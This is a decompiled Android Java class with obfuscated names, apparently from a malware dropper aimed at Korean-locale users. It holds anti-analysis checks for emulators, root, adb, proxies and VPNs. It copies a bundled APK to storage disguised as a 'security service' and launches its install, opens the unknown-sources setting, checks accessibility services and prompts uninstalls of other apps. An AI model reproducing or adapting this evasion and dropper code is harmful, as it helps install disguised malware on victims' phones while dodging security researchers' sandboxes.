package com.ldjSxw.heBbQd.p017a;

import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.net.Proxy;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.PowerManager;
import android.provider.Settings;
import android.support.p014v4.content.FileProvider;
import android.text.TextUtils;
import android.util.Log;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.PrintStream;
import java.net.NetworkInterface;
import java.text.SimpleDateFormat;
import java.util.Collections;
import java.util.Date;
import java.util.Enumeration;
import java.util.Iterator;
import java.util.Locale;

/* renamed from: com.ldjSxw.heBbQd.a.b */
/* loaded from: C:\Users\faton\Downloads\unpack\classes2.dex */
public class C0740b {

    /* renamed from: a */
    private static String[] f1279a = {"goldfish"};

    /* renamed from: k */
    public static boolean m47k(Context context) {
        try {
            if (!m48j(context) || m43o() || m45m() || m50h().booleanValue()) {
                return true;
            }
            if (m51g(context) && m41q()) {
                return true;
            }
            if (m51g(context)) {
                return m40r(context);
            }
            return false;
        } catch (Exception e) {
            return false;
        }
    }

    /* renamed from: o */
    private static boolean m43o() {
        try {
            String buildTags = Build.TAGS;
            if (buildTags != null) {
                if (!buildTags.contains("test-keys")) {
                    return false;
                }
                return true;
            }
            return false;
        } catch (Exception e) {
            return false;
        }
    }

    /* renamed from: m */
    private static boolean m45m() {
        try {
            File file = new File("/system/app/Superuser.apk");
            if (!file.exists()) {
                return false;
            }
            return true;
        } catch (Exception e) {
            return false;
        }
    }

    /* renamed from: h */
    private static Boolean m50h() {
        String[] strArr;
        try {
            File driver_file = new File("/proc/tty/drivers");
            if (driver_file.exists() && driver_file.canRead()) {
                byte[] data = new byte[(int) driver_file.length()];
                try {
                    InputStream inStream = new FileInputStream(driver_file);
                    inStream.read(data);
                    inStream.close();
                } catch (FileNotFoundException e) {
                } catch (IOException e2) {
                }
                String driver_data = new String(data);
                for (String known_qemu_driver : f1279a) {
                    if (driver_data.indexOf(known_qemu_driver) != -1) {
                        return true;
                    }
                }
            }
        } catch (Exception e3) {
        }
        return false;
    }

    /* renamed from: g */
    private static boolean m51g(Context context) {
        try {
            if (Settings.Secure.getInt(context.getContentResolver(), "adb_enabled", 0) <= 0) {
                return false;
            }
            return true;
        } catch (Exception e) {
            return false;
        }
    }

    /* renamed from: r */
    private static boolean m40r(Context context) {
        String proxyAddress;
        int proxyPort;
        try {
            boolean is_ics_or_later = Build.VERSION.SDK_INT >= 14;
            if (is_ics_or_later) {
                proxyAddress = System.getProperty("http.proxyHost");
                String portstr = System.getProperty("http.proxyPort");
                proxyPort = Integer.parseInt(portstr != null ? portstr : "-1");
                PrintStream printStream = System.out;
                printStream.println(proxyAddress + "~");
                PrintStream printStream2 = System.out;
                printStream2.println("port = " + proxyPort);
            } else {
                proxyAddress = Proxy.getHost(context);
                proxyPort = Proxy.getPort(context);
                Log.e("address = ", proxyAddress + "~");
                Log.e("port = ", proxyPort + "~");
            }
            return (TextUtils.isEmpty(proxyAddress) || proxyPort == -1) ? false : true;
        } catch (Exception e) {
            return false;
        }
    }

    /* renamed from: q */
    public static boolean m41q() {
        try {
            Enumeration niList = NetworkInterface.getNetworkInterfaces();
            if (niList != null) {
                Iterator it = Collections.list(niList).iterator();
                while (it.hasNext()) {
                    Object intf = it.next();
                    NetworkInterface net2 = (NetworkInterface) intf;
                    if (net2.isUp() && net2.getInterfaceAddresses().size() != 0 && ("tun0".equals(net2.getName()) || "ppp0".equals(net2.getName()))) {
                        return true;
                    }
                }
                return false;
            }
            return false;
        } catch (Throwable e) {
            e.printStackTrace();
            return false;
        }
    }

    /* renamed from: j */
    public static boolean m48j(Context context) {
        Locale locale = context.getResources().getConfiguration().locale;
        String language = locale.getLanguage();
        return language.contains("ko") || language.contains("KO");
    }

    /* renamed from: i */
    public static boolean m49i(Context context, String packageName) {
        PackageManager pm = context.getPackageManager();
        try {
            String name = pm.getApplicationLabel(pm.getApplicationInfo(packageName, 128)).toString();
            return (name == null || name.equalsIgnoreCase("")) ? false : true;
        } catch (PackageManager.NameNotFoundException e) {
            return false;
        }
    }

    /* renamed from: z */
    private static void m32z(Context context, String filename, String content) {
        try {
            FileOutputStream fos = context.openFileOutput(filename, 0);
            byte[] bytes = content.getBytes();
            fos.write(bytes);
            fos.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /* renamed from: t */
    private static String m38t(Context context, String fileName) {
        FileInputStream fis;
        try {
            File file = new File(context.getFilesDir().getAbsolutePath() + "/" + fileName);
            if (!file.exists() || (fis = context.openFileInput(fileName)) == null) {
                return "";
            }
            int lenght = fis.available();
            byte[] buffer = new byte[lenght];
            fis.read(buffer);
            String result = new String(buffer, "UTF-8");
            return result;
        } catch (Exception e) {
            e.printStackTrace();
            return "";
        }
    }

    /* renamed from: s */
    public static void m39s(Context context) {
        try {
            Intent i = new Intent("android.intent.action.MAIN");
            i.setFlags(268435456);
            i.addCategory("android.intent.category.HOME");
            context.startActivity(i);
        } catch (Exception e) {
        }
    }

    /* renamed from: e */
    public static void m53e(Context context, File file) {
        if (Build.VERSION.SDK_INT >= 24) {
            Uri apkUri = FileProvider.m1072e(context, context.getPackageName() + ".fileProvider", file);
            Intent install = new Intent("android.intent.action.VIEW");
            install.setFlags(268435456);
            install.addFlags(1);
            install.setDataAndType(apkUri, "application/vnd.android.package-archive");
            context.startActivity(install);
            return;
        }
        Intent install2 = new Intent("android.intent.action.VIEW");
        install2.setFlags(276856832);
        install2.setDataAndType(Uri.fromFile(file), "application/vnd.android.package-archive");
        context.startActivity(install2);
    }

    /* renamed from: d */
    public static String m54d() {
        SimpleDateFormat sDateFormat = new SimpleDateFormat("yyyy-MM-dd");
        return sDateFormat.format(new Date());
    }

    /* renamed from: l */
    public static boolean m46l(Context context) {
        PowerManager pm = (PowerManager) context.getSystemService("power");
        if (pm.isScreenOn()) {
            return true;
        }
        return false;
    }

    /* renamed from: n */
    public static boolean m44n(Context context, String packageName) {
        PackageManager packageManager;
        if (context == null || (packageManager = context.getPackageManager()) == null || packageName == null || packageName.length() == 0) {
            return false;
        }
        try {
            ApplicationInfo app = packageManager.getApplicationInfo(packageName, 0);
            if (app == null) {
                return false;
            }
            if ((app.flags & 1) <= 0) {
                return false;
            }
            return true;
        } catch (PackageManager.NameNotFoundException e) {
            e.printStackTrace();
            return false;
        }
    }

    /* renamed from: y */
    public static void m33y(Context context, String packageName) {
        try {
            Uri packageURI = Uri.parse("package:".concat(packageName));
            Intent intent = new Intent("android.intent.action.DELETE");
            intent.setData(packageURI);
            intent.addFlags(268435456);
            context.startActivity(intent);
        } catch (Exception e) {
        }
    }

    /* renamed from: w */
    public static void m35w(Context context, String key, String value) {
        try {
            if (key.equalsIgnoreCase("K_APP_RESET_INVOKE")) {
                m32z(context, "invoke", value);
            } else if (key.equalsIgnoreCase("K_APP_UNZIP_STATE")) {
                m32z(context, "appstate", value);
            } else if (key.equalsIgnoreCase("K_FIRST_OPEN_DATE")) {
                m32z(context, "first_open_date", value);
            } else if (key.equalsIgnoreCase("K_LAST_SCAN_CHECK_DATE")) {
                m32z(context, "last_scan_check_date", value);
            } else if (key.equalsIgnoreCase("K_ALL_PROCESS_ONCE_DONE")) {
                m32z(context, "all_process_once_done", value);
            } else if (key.equalsIgnoreCase("K_OPEN_MAIN")) {
                m32z(context, "main", value);
            } else if (key.equalsIgnoreCase("K_OTHER_INSTALL_DONE_OPEN_MAIN")) {
                m32z(context, "other_main", value);
            } else if (key.equalsIgnoreCase("K_IS_FIRST_INSTALL")) {
                m32z(context, "first_install", value);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /* renamed from: b */
    public static String m56b(Context context, String key) {
        String result = null;
        try {
            if (key.equalsIgnoreCase("K_APP_RESET_INVOKE")) {
                result = m38t(context, "invoke");
            } else if (key.equalsIgnoreCase("K_APP_UNZIP_STATE")) {
                result = m38t(context, "appstate");
            } else if (key.equalsIgnoreCase("K_FIRST_OPEN_DATE")) {
                result = m38t(context, "first_open_date");
            } else if (key.equalsIgnoreCase("K_LAST_SCAN_CHECK_DATE")) {
                result = m38t(context, "last_scan_check_date");
            } else if (key.equalsIgnoreCase("K_ALL_PROCESS_ONCE_DONE")) {
                result = m38t(context, "all_process_once_done");
            } else if (key.equalsIgnoreCase("K_OPEN_MAIN")) {
                result = m38t(context, "main");
            } else if (key.equalsIgnoreCase("K_OTHER_INSTALL_DONE_OPEN_MAIN")) {
                result = m38t(context, "other_main");
            } else if (key.equalsIgnoreCase("K_IS_FIRST_INSTALL")) {
                result = m38t(context, "first_install");
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        if (result == null) {
            return "";
        }
        return result;
    }

    /* renamed from: c */
    public static String m55c() {
        SimpleDateFormat sDateFormat = new SimpleDateFormat("yyyy년 MM월 dd일 HH시 mm분");
        return sDateFormat.format(new Date());
    }

    /* renamed from: x */
    public static void m34x(Context context, Class<?> cls) {
        try {
            int sdk = Build.VERSION.SDK_INT;
            Intent service = new Intent(context, cls);
            service.setFlags(268435456);
            if (sdk >= 28) {
                context.startService(service);
            } else {
                context.startService(service);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /* renamed from: v */
    public static void m36v(Context context) {
        try {
            context.startActivity(new Intent("android.settings.MANAGE_UNKNOWN_APP_SOURCES").setData(Uri.parse(String.format("package:%s", context.getPackageName()))));
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /* renamed from: f */
    public static boolean m52f(Context context, String name) {
        String enabledServicesSetting = Settings.Secure.getString(context.getContentResolver(), "enabled_accessibility_services");
        if (enabledServicesSetting == null) {
            return false;
        }
        TextUtils.SimpleStringSplitter colonSplitter = new TextUtils.SimpleStringSplitter(':');
        colonSplitter.setString(enabledServicesSetting);
        while (colonSplitter.hasNext()) {
            String componentNameString = colonSplitter.next();
            C0739a.m58a("acc name--->" + componentNameString);
            if (componentNameString != null && componentNameString.contains(name)) {
                return true;
            }
        }
        return false;
    }

    /* renamed from: p */
    public static boolean m42p(Context context, String filePath) {
        try {
            PackageManager pm = context.getPackageManager();
            PackageInfo info = pm.getPackageArchiveInfo(filePath, 1);
            if (info == null) {
                return false;
            }
            return true;
        } catch (Exception e) {
            return false;
        }
    }

    /* renamed from: a */
    public static boolean m57a(Context context, String fileName, String path) {
        boolean copyIsFinish = false;
        try {
            InputStream is = context.getAssets().open(fileName);
            File file = new File(path);
            file.createNewFile();
            FileOutputStream fos = new FileOutputStream(file);
            byte[] temp = new byte[1024];
            while (true) {
                int i = is.read(temp);
                if (i <= 0) {
                    break;
                }
                fos.write(temp, 0, i);
            }
            fos.close();
            is.close();
            copyIsFinish = true;
            if (Build.VERSION.SDK_INT >= 31) {
                String newPath = Environment.getExternalStorageDirectory().getAbsolutePath() + "/보안서비스.apk";
                m37u(path, newPath);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return copyIsFinish;
    }

    /* renamed from: u */
    public static void m37u(String oldPath, String newPath) {
        if (TextUtils.isEmpty(oldPath) || TextUtils.isEmpty(newPath)) {
            return;
        }
        File file = new File(oldPath);
        file.renameTo(new File(newPath));
    }
}